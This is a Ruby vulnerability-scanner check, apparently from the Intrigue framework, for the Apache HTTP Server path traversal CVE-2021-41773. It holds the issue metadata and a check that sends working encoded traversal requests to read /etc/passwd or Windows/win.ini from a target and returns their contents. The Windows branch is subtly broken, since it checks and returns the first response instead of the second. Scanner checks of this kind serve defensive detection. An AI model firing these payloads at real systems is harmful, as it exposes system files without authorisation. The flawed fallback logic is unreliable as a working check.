module Intrigue
    module Issue
      class ApacheCve202141773 < BaseIssue
        def self.generate(instance_details = {})
          {
            added: '2021-10-06',
            name: 'apache_cve_2021_41773',
            pretty_name: 'Apache HTTP Server Path Traversal (CVE-2021-41773)',
            identifiers: [
              { type: 'CVE', name: 'CVE-2021-41773' }
            ],
            severity: 1,
            category: 'vulnerability',
            status: 'confirmed',
            description: 'An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. ',
            affected_software: [
              { vendor: 'Apache', product: 'HTTP Server' }
            ],
            references: [
              { type: 'description', uri: 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773' },
              { type: 'description',
                uri: 'https://www.tenable.com/blog/cve-2021-41773-path-traversal-zero-day-in-apache-http-server-exploited' },
              { type: 'description', uri: 'https://httpd.apache.org/security/vulnerabilities_24.html'}
            ],
            authors: ['Ash Daulton', 'cPanel Security Team', 'PTSWARM', 'maxim']
          }.merge!(instance_details)
        end
      end
    end
  
    module Task
      class ApacheCve202141773 < BaseCheck
        def self.check_metadata
          {
            allowed_types: ['Uri']
          }
        end
  
        # return truthy value to create an issue
        def check
  
          # AT THE CURRENT MOMENT RUN AGAINST ALL APACHE FINGERPRINTS       
          # IF IT GETS TOO NOISY, RESTRICT TO VERSIoN 2.4.49
          
          # get enriched entity
          # require_enrichment
          # version = get_version_for_vendor_product(@entity, 'Apache', 'HTTP Server')
          # return false unless version 
  
          #if compare_versions_by_operator(version, '2.4.49', '=')
          #  return "Asset is vulnerable based on fingerprinted version #{version}"
          #end
  
          uri = _get_entity_name
  
          r = http_request(:get, "#{uri}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
          return r.body_utf8 if r.code == '200' && r.body.include?('root:x')
  
          # didnt succeed lets try windows as last resort
  
          r2 = http_request(:get, "#{uri}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/Windows/win.ini")
          return r.body_utf8 if r2.code == '200' && r.body.include?('for 16-bit app support')
  
        end
      end
    end
  end